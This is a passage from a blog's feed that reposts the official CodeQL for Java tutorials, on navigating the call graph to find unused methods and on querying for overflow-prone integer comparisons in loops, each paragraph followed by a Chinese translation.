<code>Client.main</code> would return <code>Super.getX</code>. At runtime, though, this call would actually invoke <code>Sub.getX</code>.</p><blockquote><p>例如，在我们的例子中，Client.main中第二个调用的getCallee将返回Super.getX。但在运行时，这个调用实际上会调用Sub.getX。</p></blockquote><p>Class <code>Callable</code> defines a large number of member predicates; for our purposes, the two most important ones are:</p><blockquote><p>类Callable定义了大量的成员谓词；对于我们的目的，最重要的两个谓词是。</p></blockquote><ul><li><p><code>calls(Callable target)</code> succeeds if this callable contains a call whose callee is <code>target</code>.</p></li><li><p>calls(Callable target)如果这个callable包含一个call，其calllee是target，则成功。</p></li><li><p><code>polyCalls(Callable target)</code> succeeds if this callable may call <code>target</code> at runtime; this is the case if it contains a call whose callee is either <code>target</code> or a method that <code>target</code> overrides.</p></li><li><p>polyCalls(Callable target)如果这个callable在运行时可以调用target，那么就会成功；如果它包含一个call，其calllee是target或target覆盖的方法，那么就会成功。</p></li></ul><p>In our example, <code>Client.main</code> calls the constructor <code>Sub(int)</code> and the method <code>Super.getX</code>; additionally, it <code>polyCalls</code> method <code>Sub.getX</code>.</p><blockquote><p>在我们的例子中，Client.main调用了构造函数Sub(int)和方法Super.getX；此外，它还polyCalls方法Sub.getX。</p></blockquote><h2 id="Example-Finding-unused-methods"><a href="#Example-Finding-unused-methods" class="headerlink" title="Example: Finding unused methods"></a>Example: Finding unused methods</h2><p>We can use the <code>Callable</code> class to write a query that finds methods that are not called by any other method:</p><blockquote><p>我们可以使用Callable类来写一个查询，找到没有被其他方法调用的方法:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Callable callee</span><br><span class="line">where not exists(Callable caller | caller.polyCalls(callee))</span><br><span class="line">select callee</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/8376915232270534450/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. This simple query typically returns a large number of results.</p><blockquote><p>➤ 在LGTM.com的查询控制台中可以看到。这种简单的查询通常会返回大量的结果。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/46u44er46ec/46u44er46ec.png" alt="image-20210325154446690"></p><p><img src="https://gitee.com/samny/images/raw/master/11u45er11ec/11u45er11ec.png" alt="image-20210325154511712"></p><blockquote><p>Note</p><p>We have to use <code>polyCalls</code> instead of <code>calls</code> here: we want to be reasonably sure that <code>callee</code> is not called, either directly or via overriding.</p><p>我们必须在这里使用 polyCalls 而不是调用：我们要合理地确定 callee 没有被调用，无论是直接调用还是通过覆盖调用。</p></blockquote><p>Running this query on a typical Java project results in lots of hits in the Java standard library. This makes sense, since no single client program uses every method of the standard library. More generally, we may want to exclude methods and constructors from compiled libraries. We can use the predicate <code>fromSource</code> to check whether a compilation unit is a source file, and refine our query:</p><blockquote><p>在一个典型的Java项目上运行这个查询的结果是，在Java标准库中会有很多点击。这是有道理的，因为没有一个客户程序会使用标准库的每一个方法。更一般的情况下，我们可能希望从编译库中排除方法和构造函数。我们可以使用fromSource谓词来检查一个编译单元是否是源文件，并完善我们的查询:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Callable callee</span><br><span class="line">where not exists(Callable caller | caller.polyCalls(callee)) and</span><br><span class="line">    callee.getCompilationUnit().fromSource()</span><br><span class="line">select callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/8711624074465690976/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. This change reduces the number of results returned for most projects.</p><blockquote><p>➤ 在LGTM.com的查询控制台中可以看到。这个变化减少了大多数项目返回的结果数量。</p></blockquote><p><img src="/.io//C:%5CUsers%5CSamny%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210325164432951.png" alt="image-20210325164432951"></p><p><img src="https://gitee.com/samny/images/raw/master/48u44er48ec/48u44er48ec.png" alt="image-20210325164448392"></p><p><img src="https://gitee.com/samny/images/raw/master/54u44er54ec/54u44er54ec.png" alt="image-20210325164454547"></p><p>We might also notice several unused methods with the somewhat strange name <code>&lt;clinit&gt;</code>: these are class initializers; while they are not explicitly called anywhere in the code, they are called implicitly whenever the surrounding class is loaded. Hence it makes sense to exclude them from our query. While we are at it, we can also exclude finalizers, which are similarly invoked implicitly:</p><blockquote><p>我们还可能会注意到几个未使用的方法，它们的名称有些奇怪<clinit>：这些方法是类初始化器；虽然它们在代码中的任何地方都没有被显式调用，但每当加载周围的类时，它们就会被隐式调用。因此，将它们从我们的查询中排除是有意义的。当我们在这里的时候，我们也可以排除最终化器，它们同样是隐式调用的:</clinit></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Callable callee</span><br><span class="line">where not exists(Callable caller | caller.polyCalls(callee)) and</span><br><span class="line">    callee.getCompilationUnit().fromSource() and</span><br><span class="line">    not callee.hasName(&quot;&lt;clinit&gt;&quot;) and not callee.hasName(&quot;finalize&quot;)</span><br><span class="line">select callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/925473733866047471/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. This also reduces the number of results returned by most projects.</p><blockquote><p>➤ 在LGTM.com的查询控制台中可以看到。这也减少了大多数项目返回的结果数量。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/52u43er52ec/52u43er52ec.png" alt="image-20210325164333796"></p><p><img src="https://gitee.com/samny/images/raw/master/1u44er1ec/1u44er1ec.png" alt="image-20210325164401002"></p><p><img src="https://gitee.com/samny/images/raw/master/15u44er15ec/15u44er15ec.png" alt="image-20210325164415230"></p><p>We may also want to exclude public methods from our query, since they may be external API entry points:</p><blockquote><p>我们可能还想从查询中排除公共方法，因为它们可能是外部 API 入口点:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Callable callee</span><br><span class="line">where not exists(Callable caller | caller.polyCalls(callee)) and</span><br><span class="line">    callee.getCompilationUnit().fromSource() and</span><br><span class="line">    not callee.hasName(&quot;&lt;clinit&gt;&quot;) and not callee.hasName(&quot;finalize&quot;) and</span><br><span class="line">    not callee.isPublic()</span><br><span class="line">select callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/6284320987237954610/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. This should have a more noticeable effect on the number of results returned.</p><blockquote><p>➤ 在LGTM.com的查询控制台中可以看到。这对返回的结果数量应该有比较明显的影响。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/53u49er53ec/53u49er53ec.png" alt="image-20210325164953331"></p><p><img src="https://gitee.com/samny/images/raw/master/15u50er15ec/15u50er15ec.png" alt="image-20210325165015867"></p><p><img src="https://gitee.com/samny/images/raw/master/26u50er26ec/26u50er26ec.png" alt="image-20210325165026661"></p><p>A further special case is non-public default constructors: in the singleton pattern, for example, a class is provided with private empty default constructor to prevent it from being instantiated. Since the very purpose of such constructors is their not being called, they should not be flagged up:</p><blockquote><p>还有一种特殊情况是非公共的默认构造函数：例如，在单子模式中，一个类提供了私有的空默认构造函数，以防止它被实例化。由于这类构造函数的目的就是它们不被调用，所以不应该将它们标记起来:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Callable callee</span><br><span class="line">where not exists(Callable caller | caller.polyCalls(callee)) and</span><br><span class="line">    callee.getCompilationUnit().fromSource() and</span><br><span class="line">    not callee.hasName(&quot;&lt;clinit&gt;&quot;) and not callee.hasName(&quot;finalize&quot;) and</span><br><span class="line">    not callee.isPublic() and</span><br><span class="line">    not callee.(Constructor).getNumberOfParameters() &#x3D; 0</span><br><span class="line">select callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/2625028545869146918/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. This change has a large effect on the results for some projects but little effect on the results for others. Use of this pattern varies widely between different projects.</p><blockquote><p>➤ 在LGTM.com的查询控制台中可以看到。这种变化对某些项目的结果影响很大，但对其他项目的结果影响不大。这种模式的使用在不同的项目之间差异很大。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/48u02er48ec/48u02er48ec.png" alt="image-20210325200248875"></p><p><img src="https://gitee.com/samny/images/raw/master/59u54er59ec/59u54er59ec.png" alt="image-20210325165440723"></p><p><img src="https://gitee.com/samny/images/raw/master/46u54er46ec/46u54er46ec.png" alt="image-20210325165446958"></p><p>Finally, on many Java projects there are methods that are invoked indirectly by reflection. So, while there are no calls invoking these methods, they are, in fact, used. It is in general very hard to identify such methods. A very common special case, however, is JUnit test methods, which are reflectively invoked by a test runner. The CodeQL library for Java has support for recognizing test classes of JUnit and other testing frameworks, which we can employ to filter out methods defined in such classes:</p><blockquote><p>最后，在许多Java项目上，有一些方法是通过反射间接调用的。因此，虽然没有调用这些方法，但事实上，它们是被使用的。在一般情况下，很难识别这些方法。然而，一个非常常见的特殊情况是JUnit测试方法，这些方法是由测试运行器反射性调用的。Java的CodeQL库支持识别JUnit和其他测试框架的测试类，我们可以采用它来过滤掉这些类中定义的方法:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Callable callee</span><br><span class="line">where not exists(Callable caller | caller.polyCalls(callee)) and</span><br><span class="line">    callee.getCompilationUnit().fromSource() and</span><br><span class="line">    not callee.hasName(&quot;&lt;clinit&gt;&quot;) and not callee.hasName(&quot;finalize&quot;) and</span><br><span class="line">    not callee.isPublic() and</span><br><span class="line">    not callee.(Constructor).getNumberOfParameters() &#x3D; 0 and</span><br><span class="line">    not callee.getDeclaringType() instanceof TestClass</span><br><span class="line">select callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/2055862421970264112/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. This should give a further reduction in the number of results returned.</p><blockquote><p>➤ 在LGTM.com的查询控制台中可以看到。这应该会进一步减少返回结果的数量。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/35u55er35ec/35u55er35ec.png" alt="image-20210325165535738"></p><p><img src="https://gitee.com/samny/images/raw/master/51u55er51ec/51u55er51ec.png" alt="image-20210325165551041"></p><p><img src="https://gitee.com/samny/images/raw/master/16u56er16ec/16u56er16ec.png" alt="image-20210325165616137"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Navigating-the-call-graph¶&quot;&gt;&lt;a href=&quot;#Navigating-the-call-graph¶&quot; class=&quot;headerlink&quot; title=&quot;Navigating the call graph¶&quot;&gt;&lt;/a&gt;Navigati
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>Overflow-prone comparisons in Java</title>
    <link href="https://summersec.github.io/2021/03/25/Overflow-prone%20comparisons%20in%20Java/"/>
    <id>https://summersec.github.io/2021/03/25/Overflow-prone%20comparisons%20in%20Java/</id>
    <published>2021-03-25T08:57:59.313Z</published>
    <updated>2021-03-25T09:00:11.102Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title: Overflow-prone comparisons in Java<br>photos: ‘<a href="https://acg.toubiec.cn/random?ssl=true&amp;id=zOcwUy5cQWGbSmnx&#39;" target="_blank" rel="noopener">https://acg.toubiec.cn/random?ssl=true&amp;id=zOcwUy5cQWGbSmnx&#39;</a><br>date: 2021-03-24 19:01:42<br>tags:<br>categories: codeql<br>password:<br>permalink:</p><hr><h1 id="Overflow-prone-comparisons-in-Java¶"><a href="#Overflow-prone-comparisons-in-Java¶" class="headerlink" title="Overflow-prone comparisons in Java¶"></a>Overflow-prone comparisons in Java<a href="https://codeql.github.com/docs/codeql-language-guides/overflow-prone-comparisons-in-java/#overflow-prone-comparisons-in-java" target="_blank" rel="noopener">¶</a></h1><p>You can use CodeQL to check for comparisons in Java code where one side of the comparison is prone to overflow.</p><blockquote><p>你可以使用CodeQL来检查Java代码中的比较，比较的一方容易溢出。</p></blockquote><h2 id="About-this-article"><a href="#About-this-article" class="headerlink" title="About this article"></a>About this article</h2><p>In this tutorial article you’ll write a query for finding comparisons between integers and long integers in loops that may lead to non-termination due to overflow.</p><blockquote><p>在这篇教程文章中，你将写一个查询，用于查找循环中整数和长整数之间的比较，这些比较可能会由于溢出而导致非终止。</p></blockquote><p>To begin, consider this code snippet:</p><blockquote><p>首先，考虑这个代码片段:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void foo(long l) &#123;</span><br><span class="line">    for(int i&#x3D;0; i&lt;l; i++) &#123;</span><br><span class="line">        &#x2F;&#x2F; do something</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If <code>l</code> is bigger than 231- 1 (the largest positive value of type <code>int</code>), then this loop will never terminate: <code>i</code> will start at zero, being incremented all the way up to 231- 1, which is still smaller than <code>l</code>. When it is incremented once more, an arithmetic overflow occurs, and <code>i</code> becomes -231, which also is smaller than <code>l</code>! Eventually, <code>i</code> will reach zero again, and the cycle repeats.</p><blockquote><p>如果l大于231- 1（int类型的最大正值），那么这个循环将永远不会终止：i将从零开始，一直递增到231- 1，这仍然小于l.当它再次递增时，发生算术溢出，i变成-231，这也小于l！最终，i将再次达到零，并重复循环。最终，i将再次达到零，循环往复。</p></blockquote><blockquote><p>More about overflow</p><p>All primitive numeric types have a maximum value, beyond which they will wrap around to their lowest possible value (called an “overflow”). For <code>int</code>, this maximum value is 231- 1. Type <code>long</code> can accommodate larger values up to a maximum of 263- 1. In this example, this means that <code>l</code> can take on a value that is higher than the maximum for type <code>int</code>; <code>i</code> will never be able to reach this value, instead overflowing and returning to a low value.</p><p>所有的基元数字类型都有一个最大值，超过这个最大值，它们就会被包围到可能的最低值（称为 “溢出”），对于int来说，这个最大值是231- 1，long类型可以容纳更大的值，最大为263- 1。对于int来说，这个最大值是231- 1，而long类型可以容纳更大的值，最大值是263- 1。在这个例子中，这意味着l可以接受一个比int类型的最大值更高的值；i将永远无法达到这个值，而是溢出并返回一个低值。</p></blockquote><p>We’re going to develop a query that finds code that looks like it might exhibit this kind of behavior. We’ll be using several of the standard library classes for representing statements and functions. For a full list, see “<a href="https://codeql.github.com/docs/codeql-language-guides/abstract-syntax-tree-classes-for-working-with-java-programs/" target="_blank" rel="noopener">Abstract syntax tree classes for working with Java programs</a>.”</p><blockquote><p>我们将开发一个查询，找到看起来可能表现出这种行为的代码。我们将使用几个标准库类来表示语句和函数。有关完整的列表，请参见 “用于处理Java程序的抽象语法树类”。</p></blockquote><h2 id="Initial-query"><a href="#Initial-query" class="headerlink" title="Initial query"></a>Initial query</h2><p>We’ll start by writing a query that finds less-than expressions (CodeQL class <code>LTExpr</code>) where the left operand is of type <code>int</code> and the right operand is of type <code>long</code>:</p><blockquote><p>我们先写一个查找小于表达式的查询(CodeQL类LTExpr)，其中左操作数的类型是int，右操作数的类型是long:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from LTExpr expr</span><br><span class="line">where expr.getLeftOperand().getType().hasName(&quot;int&quot;) and</span><br><span class="line">    expr.getRightOperand().getType().hasName(&quot;long&quot;)</span><br><span class="line">select expr</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/490866529746563234/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. This query usually finds results on most projects.</p><blockquote><p>➤ 在LGTM.com的查询控制台中可以看到。这个查询通常能在大多数项目上找到结果。</p></blockquote><p><img src="/.io//C:%5CUsers%5CSamny%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210324163948437.png" alt="image-20210324163948437"></p><p><img src="/.io//C:%5CUsers%5CSamny%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210324163958286.png" alt="image-20210324163958286"></p><p><img src="https://gitee.com/samny/images/raw/master/25u40er25ec/25u40er25ec.png" alt="image-20210324164025185"></p><p>Notice that we use the predicate <code>getType</code> (available on all subclasses of <code>Expr</code>) to determine the type of the operands. Types, in turn, define the <code>hasName</code> predicate, which allows us to identify the primitive types <code>int</code> and <code>long</code>. As it stands, this query finds <em>all</em> less-than expressions comparing <code>int</code> and <code>long</code>, but in fact we are only interested in comparisons that are part of a loop condition. Also, we want to filter out comparisons where either operand is constant, since these are less likely to be real bugs. The revised query looks like this:</p><blockquote><p>请注意，我们使用谓词 getType（可用于 Expr 的所有子类）来确定操作数的类型。Types则定义了hasName谓词，它允许我们识别基元类型int和long。目前来看，这个查询可以找到所有比较int和long的小于表达式，但实际上我们只对作为循环条件一部分的比较感兴趣。另外，我们希望过滤掉操作数为常数的比较，因为这些比较不太可能是真正的错误。修改后的查询是这样的:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from LTExpr expr</span><br><span class="line">where expr.getLeftOperand().getType().hasName(&quot;int&quot;) and</span><br><span class="line">    expr.getRightOperand().getType().hasName(&quot;long&quot;) and</span><br><span class="line">    exists(LoopStmt l | l.getCondition().getAChildExpr*() &#x3D; expr) and</span><br><span class="line">    not expr.getAnOperand().isCompileTimeConstant()</span><br><span class="line">select expr</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/4315986481180063825/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. Notice that fewer results are found.</p><blockquote><p>➤ 在LGTM.com的查询控制台中看到。注意，发现的结果较少。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/38u41er38ec/38u41er38ec.png" alt="image-20210324164138891"></p><p><img src="https://gitee.com/samny/images/raw/master/11u42er11ec/11u42er11ec.png" alt="image-20210324164211737"></p><p>The class <code>LoopStmt</code> is a common superclass of all loops, including, in particular, <code>for</code> loops as in our example above. While different kinds of loops have different syntax, they all have a loop condition, which can be accessed through predicate <code>getCondition</code>. We use the reflexive transitive closure operator <code>*</code> applied to the <code>getAChildExpr</code> predicate to express the requirement that <code>expr</code> should be nested inside the loop condition. In particular, it can be the loop condition itself.</p><blockquote><p>LoopStmt 类是所有循环的共同超类，特别是包括我们上面例子中的 for 循环。虽然不同种类的循环有不同的语法，但它们都有一个循环条件，可以通过谓词getCondition访问。我们使用应用于getAChildExpr谓词的反身转义闭合操作符*来表达expr应该嵌套在循环条件里面的要求。特别是，它可以是循环条件本身。</p></blockquote><p>The final conjunct in the <code>where</code> clause takes advantage of the fact that <a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates" target="_blank" rel="noopener">predicates</a> can return more than one value (they are really relations). In particular, <code>getAnOperand</code> may return <em>either</em> operand of <code>expr</code>, so <code>expr.getAnOperand().isCompileTimeConstant()</code> holds if at least one of the operands is constant. Negating this condition means that the query will only find expressions where <em>neither</em> of the operands is constant.</p><blockquote><p>where子句中的最后一个连词利用了谓词可以返回多个值的事实（它们实际上是关系）。特别是，getAnOperand可以返回expr的任何一个操作数，所以expr.getAnOperand().isCompileTimeConstant()在操作数中至少有一个是常数时成立。否定这个条件意味着查询将只找到操作数都不是常数的表达式。</p></blockquote><h2 id="Generalizing-the-query"><a href="#Generalizing-the-query" class="headerlink" title="Generalizing the query"></a>Generalizing the query</h2><p>Of course, comparisons between <code>int</code> and <code>long</code> are not the only problematic case: any less-than comparison between a narrower and a wider type is potentially suspect, and less-than-or-equals, greater-than, and greater-than-or-equals comparisons are just as problematic as less-than comparisons.</p><blockquote><p>当然，int和long之间的比较并不是唯一有问题的情况：窄类型和宽类型之间的任何小于等于的比较都有可能是可疑的，小于或等于、大于等于和大于等于的比较和小于等于的比较一样有问题。</p></blockquote><p>In order to compare the ranges of types, we define a predicate that returns the width (in bits) of a given integral type:</p><blockquote><p>为了比较类型的范围，我们定义了一个谓词来返回给定积分类型的宽度（以位为单位）:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int width(PrimitiveType pt) &#123;</span><br><span class="line">    (pt.hasName(&quot;byte&quot;) and result&#x3D;8) or</span><br><span class="line">    (pt.hasName(&quot;short&quot;) and result&#x3D;16) or</span><br><span class="line">    (pt.hasName(&quot;char&quot;) and result&#x3D;16) or</span><br><span class="line">    (pt.hasName(&quot;int&quot;) and result&#x3D;32) or</span><br><span class="line">    (pt.hasName(&quot;long&quot;) and result&#x3D;64)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We now want to generalize our query to apply to any comparison where the width of the type on the smaller end of the comparison is less than the width of the type on the greater end. Let’s call such a comparison <em>overflow prone</em>, and introduce an abstract class to model it:</p><blockquote><p>我们现在想把我们的查询泛化为适用于任何比较，在比较中较小端类型的宽度小于较大端类型的宽度。让我们把这样的比较称为溢出式比较，并引入一个抽象类来模拟它。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">abstract class OverflowProneComparison extends ComparisonExpr &#123;</span><br><span class="line">    Expr getLesserOperand() &#123; none() &#125;</span><br><span class="line">    Expr getGreaterOperand() &#123; none() &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There are two concrete child classes of this class: one for <code>&lt;=</code> or <code>&lt;</code> comparisons, and one for <code>&gt;=</code> or <code>&gt;</code> comparisons. In both cases, we implement the constructor in such a way that it only matches the expressions we want:</p><blockquote><p>这个类有两个具体的子类：一个用于&lt;=或&lt;比较，另一个用于&gt;=或&gt;比较。在这两种情况下，我们以这样的方式实现构造函数，使它只匹配我们想要的表达式。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class LTOverflowProneComparison extends OverflowProneComparison &#123;</span><br><span class="line">    LTOverflowProneComparison() &#123;</span><br><span class="line">        (this instanceof LEExpr or this instanceof LTExpr) and</span><br><span class="line">        width(this.getLeftOperand().getType()) &lt; width(this.getRightOperand().getType())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GTOverflowProneComparison extends OverflowProneComparison &#123;</span><br><span class="line">    GTOverflowProneComparison() &#123;</span><br><span class="line">        (this instanceof GEExpr or this instanceof GTExpr) and</span><br><span class="line">        width(this.getRightOperand().getType()) &lt; width(this.getLeftOperand().getType())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now we rewrite our query to make use of these new classes:</p><blockquote><p>现在我们重写我们的查询来使用这些新类:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return the width (in bits) of a given integral type </span><br><span class="line">int width(PrimitiveType pt) &#123;</span><br><span class="line">  (pt.hasName(&quot;byte&quot;) and result&#x3D;8) or</span><br><span class="line">  (pt.hasName(&quot;short&quot;) and result&#x3D;16) or</span><br><span class="line">  (pt.hasName(&quot;char&quot;) and result&#x3D;16) or</span><br><span class="line">  (pt.hasName(&quot;int&quot;) and result&#x3D;32) or</span><br><span class="line">  (pt.hasName(&quot;long&quot;) and result&#x3D;64)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Find any comparison where the width of the type on the smaller end of </span><br><span class="line">&#x2F;&#x2F; the comparison is less than the width of the type on the greater end</span><br><span class="line">abstract class OverflowProneComparison extends ComparisonExpr &#123;</span><br><span class="line">  Expr getLesserOperand() &#123; none() &#125;</span><br><span class="line">  Expr getGreaterOperand() &#123; none() &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return &#96;&lt;&#x3D;&#96; and &#96;&lt;&#96; comparisons</span><br><span class="line">class LTOverflowProneComparison extends OverflowProneComparison &#123;</span><br><span class="line">  LTOverflowProneComparison() &#123;</span><br><span class="line">    (this instanceof LEExpr or this instanceof LTExpr) and</span><br><span class="line">    width(this.getLeftOperand().getType()) &lt; width(this.getRightOperand().getType())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return &#96;&gt;&#x3D;&#96; and &#96;&gt;&#96; comparisons</span><br><span class="line">class GTOverflowProneComparison extends OverflowProneComparison &#123;</span><br><span class="line">  GTOverflowProneComparison() &#123;</span><br><span class="line">    (this instanceof GEExpr or this instanceof GTExpr) and</span><br><span class="line">    width(this.getRightOperand().getType()) &lt; width(this.getLeftOperand().getType())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from OverflowProneComparison expr</span><br><span class="line">where exists(LoopStmt l | l.getCondition().getAChildExpr*() &#x3D; expr) and</span><br><span class="line">      not expr.getAnOperand().isCompileTimeConstant()</span><br><span class="line">select expr</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/506868054626167462/" target="_blank" rel="noopener">See the full query in the query console on LGTM.com</a>.</p><blockquote><p>➤ 在LGTM.com的查询控制台中查看完整的查询。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/13u44er13ec/13u44er13ec.png" alt="image-20210324164413796"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;title: Overflow-prone comparisons in Java&lt;br&gt;photos: ‘&lt;a href=&quot;https://acg.toubiec.cn/random?ssl=true&amp;amp;id=zOcwUy5cQWGbSmnx&amp;#39;&quot; 
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CodeQL library for Java</title>
    <link href="https://summersec.github.io/2021/03/24/CodeQL%20library%20for%20Java/"/>
    <id>https://summersec.github.io/2021/03/24/CodeQL%20library%20for%20Java/</id>
    <published>2021-03-24T11:01:42.000Z</published>
    <updated>2021-03-22T13:43:55.207Z</updated>
    
